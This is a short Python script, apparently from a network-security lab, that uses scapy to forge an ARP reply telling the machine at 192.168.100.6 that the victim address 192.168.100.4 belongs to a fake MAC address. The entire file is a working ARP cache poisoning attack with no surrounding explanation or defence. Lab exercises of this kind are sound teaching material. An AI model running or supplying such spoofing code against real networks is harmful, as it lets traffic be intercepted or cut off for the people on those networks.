#!/usr/bin/python3
from scapy.all import*

VM_A_IP="192.168.100.6"
VM_A_MAC="08:00:27:aa:11:2f"
VICTIM_IP="192.168.100.4"
FAKE_MAC="00:0b:ac:dd:ee:ff"

print("Sending ARP req.")

ether=Ether()
ether.dst=VM_A_MAC
ether.src=FAKE_MAC

arp=ARP()
arp.psrc=VICTIM_IP
arp.hwsrc=FAKE_MAC
arp.pdst=VM_A_IP
arp.op=2
frame=ether/arp #construction of network frame consisting of
# 2 layers Ethernet Layer and ARP Layer.
sendp(frame)
 	
